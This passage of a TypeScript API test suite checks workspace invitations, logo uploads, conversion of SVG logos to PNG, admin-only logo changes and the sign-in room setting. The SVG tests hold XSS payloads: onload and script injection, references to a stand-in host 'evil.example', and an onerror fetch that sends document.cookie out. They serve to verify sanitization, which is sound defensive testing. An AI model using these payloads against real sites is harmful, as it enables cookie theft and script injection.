    expect(outbox.map((m) => m.to)).toEqual(['pieter.van.der.merwe@otherfirm.example']);
    expect(outbox[0]!.text!.split(String.fromCharCode(10))[0]).toBe('Dear colleague,');
    expect(outbox[0]!.text!).toContain('/invite/');
    expect(await actions(id)).toEqual(['workspace.created', 'invitation.created', 'invitation.sent']);
    const pieter = res.json().invitedAdmins[0].personId;
    expect((await call('GET', `/v1/workspaces/${id}/settings`, pieter)).statusCode).toBe(404);
    expect((await h.pg.query<any>(`select name, given_name, family_name from person where id = $1`, [pieter])).rows[0])
      .toEqual({ name: 'pieter.van.der.merwe@otherfirm.example', given_name: '', family_name: '' });
  });

  it('stores light and dark logos for members only', async () => {
    const res = await create({ name: 'Project Osprey', logos: { light: { contentType: 'image/png', data: PNG }, dark: { contentType: 'image/png', data: PNG } } });
    expect(res.statusCode).toBe(201);
    const id = res.json().id;
    const logo = await call('GET', `/v1/workspaces/${id}/logo/light`, h.person.anika);
    expect(logo.statusCode).toBe(200);
    expect(logo.headers['content-type']).toBe('image/png');
    expect(logo.headers['content-security-policy']).toContain('sandbox');
    expect(await sharp(logo.rawPayload).metadata()).toMatchObject({ format: 'png', width: 1, height: 1 });
    expect((await call('GET', `/v1/workspaces/${id}/logo/light`, h.person.jan)).statusCode).toBe(404);
    expect((await call('GET', '/v1/me/workspaces', h.person.anika)).json().items.find((r: any) => r.id === id).logos).toEqual({ light: true, dark: true });

    expect((await create({ name: 'Project Kite', logos: { light: { contentType: 'image/jpeg', data: PNG } } })).json().detail).toBe('The logo is not a valid JPEG file.');
    const svg = (s: string) => ({ contentType: 'image/svg+xml', data: Buffer.from(s).toString('base64') });
    expect((await create({ name: 'Project Kite', logos: { dark: svg('<svg onload="x()"/>') } })).json().detail).toBe('The dark-mode logo is not a valid SVG file.');
    expect((await create({ name: 'Project Kite', logos: { light: svg('<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>') } })).statusCode).toBe(201);
  });

  it('stores SVG logos as PNG at 4x', async () => {
    const svg = (s: string) => ({ contentType: 'image/svg+xml', data: Buffer.from(s).toString('base64') });
    const NS = 'xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="90" height="20"';
    const styled = `<svg ${NS}><style>.mark { fill: #ff6600 }</style><rect class="mark" width="90" height="20"/></svg>`;
    const res = await create({ name: 'Project Osprey', logos: { light: svg(styled) } });
    expect(res.statusCode).toBe(201);
    const id = res.json().id;
    const logo = await call('GET', `/v1/workspaces/${id}/logo/light`, h.person.anika);
    expect(logo.headers['content-type']).toBe('image/png');
    expect(logo.body).not.toContain('<svg');
    const { data, info } = await sharp(logo.rawPayload).ensureAlpha().raw().toBuffer({ resolveWithObject: true });
    expect([info.width, info.height]).toEqual([720, 160]);
    expect([...data.subarray((80 * 720 + 360) * 4, (80 * 720 + 360) * 4 + 4)]).toEqual([255, 102, 0, 255]);
    const stored = (await h.pg.query<any>(`select content_type, bytes from workspace_logo where workspace_id = $1`, [id])).rows[0];
    expect(stored.content_type).toBe('image/png');
    expect(Buffer.from(stored.bytes).includes('<svg')).toBe(false);

    let n = 0;
    for (const s of [
      `<svg ${NS} onload="alert(1)"><script>alert(1)</script><rect width="90" height="20" onclick="x()"/></svg>`,
      `<svg ${NS}><use xlink:href="https://evil.example/x.svg#a"/><rect width="90" height="20" style="fill:url(https://evil.example/t)"/></svg>`,
      `<svg ${NS}><style>@import url(https://evil.example/a.css);</style><rect width="90" height="20"/></svg>`,
    ]) {
      const r = await create({ name: `Project Kite ${++n}`, logos: { light: svg(s) } });
      expect([s, r.statusCode]).toEqual([s, 201]);
    }
    const broken = await create({ name: 'Project Kite', logos: { light: svg(`<svg ${NS}><image/onerror=fetch('//x/'+document.cookie) href=x></svg>`) } });
    expect([broken.statusCode, broken.json().detail]).toEqual([400, 'The logo is not a valid SVG file.']);
    const tooBig = await create({ name: 'Project Kite', logos: { light: svg(`<svg ${NS}><!-- ${'x'.repeat(260 * 1024)} --></svg>`) } });
    expect([tooBig.statusCode, tooBig.json().detail]).toEqual([400, 'The logo is larger than 256 KB. Use a smaller image.']);

    await h.pg.query(`update workspace_logo set content_type = 'image/svg+xml', bytes = $2 where workspace_id = $1 and variant = 'light'`, [id, Buffer.from(styled)]);
    const legacy = await call('GET', `/v1/workspaces/${id}/logo/light`, h.person.anika);
    expect([legacy.statusCode, legacy.headers['content-type'], legacy.rawPayload.subarray(1, 4).toString('latin1')]).toEqual([200, 'image/png', 'PNG']);
  });

  it('should only let admins change logos', async () => {
    const id = (await create({ name: 'Project Osprey' })).json().id;
    const put = (person: string, body: unknown = { contentType: 'image/png', data: PNG }) =>
      call('PUT', `/v1/workspaces/${id}/logo/dark`, person, body);
    const res = await put(h.person.anika);
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({ variant: 'dark', contentType: 'image/png', sha256: expect.stringMatching(/^[0-9a-f]{64}$/) });
    expect((await call('GET', `/v1/workspaces/${id}/logo/dark`, h.person.anika)).statusCode).toBe(200);
    expect((await put(h.person.anika, { contentType: 'image/svg+xml', data: Buffer.from('<svg onload="x()"/>').toString('base64') })).statusCode).toBe(400);
    const svgPut = await put(h.person.anika, { contentType: 'image/svg+xml', data: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" width="9" height="2" onload="x()"><rect width="9" height="2"/></svg>').toString('base64') });
    expect(svgPut.json()).toMatchObject({ variant: 'dark', contentType: 'image/png' });
    expect((await put(h.person.jan)).statusCode).toBe(404);
    expect((await call('PUT', `${W()}/logo/light`, h.person.maria, { contentType: 'image/png', data: PNG })).statusCode).toBe(403);
    const del = () => app.inject({ method: 'DELETE', url: `/v1/workspaces/${id}/logo/dark`, headers: as(h.person.anika) });
    expect((await del()).statusCode).toBe(204);
    expect((await call('GET', `/v1/workspaces/${id}/logo/dark`, h.person.anika)).statusCode).toBe(404);
    expect((await del()).statusCode).toBe(404);
    expect(await actions(id)).toEqual(['workspace.created', 'workspace.logo_changed', 'workspace.logo_changed', 'workspace.logo_removed']);
  });

  it('validates copyFrom and top folders', async () => {
    expect((await create({ name: 'Project Kite', start: 'copy' })).statusCode).toBe(400);
    expect((await create({ name: 'Project Kite', start: 'standard', topFolders: ['A'] })).statusCode).toBe(400);
    expect((await create({ name: 'Project Kite', start: 'empty', copyFrom: { workspaceId: h.ws } })).statusCode).toBe(400);
  });
});

describe('Open at sign-in', () => {
  it('keeps at most one room', async () => {
    await canCreate(h.person.anika);
    const other = (await call('POST', '/v1/workspaces', h.person.anika, { name: 'Project Osprey' })).json().id;
    expect((await call('PUT', '/v1/me/open-at-sign-in', h.person.anika, { workspaceId: h.ws })).json()).toEqual({ workspaceId: h.ws });
    let rooms = (await call('GET', '/v1/me/workspaces', h.person.anika)).json();
    expect(rooms.openAtSignInWorkspaceId).toBe(h.ws);
    expect(rooms.items.filter((r: any) => r.openAtSignIn).map((r: any) => r.id)).toEqual([h.ws]);
    await call('PUT', '/v1/me/open-at-sign-in', h.person.anika, { workspaceId: other });
    rooms = (await call('GET', '/v1/me/workspaces', h.person.anika)).json();
    expect(rooms.items.filter((r: any) => r.openAtSignIn).map((r: any) => r.id)).toEqual([other]);
    await call('PUT', '/v1/me/open-at-sign-in', h.person.anika, { workspaceId: null });
    expect((await call('GET', '/v1/me/workspaces', h.person.anika)).json().openAtSignInWorkspaceId).toBeNull();
  });

  it('refuses a room the person is not in', async () => {
    await canCreate(h.person.anika);
    const other = (await call('POST', '/v1/workspaces', h.person.anika, { name: 'Project Osprey' })).json().id;
    expect((await call('PUT', '/v1/me/open-at-sign-in', h.person.jan, { workspaceId: other })).statusCode).toBe(404);
    await call('PUT', '/v1/me/open-at-sign-in', h.person.jan, { workspaceId: h.ws });
    await h.pg.query(`update membership set valid_to = $2 where person_id = $1`, [h.person.jan, later(1).toISOString()]);
    clock = later(2);
    expect((await call('GET', '/v1/me/workspaces', h.person.jan)).json()).toEqual({ items: [], openAtSignInWorkspaceId: null });
  });
});
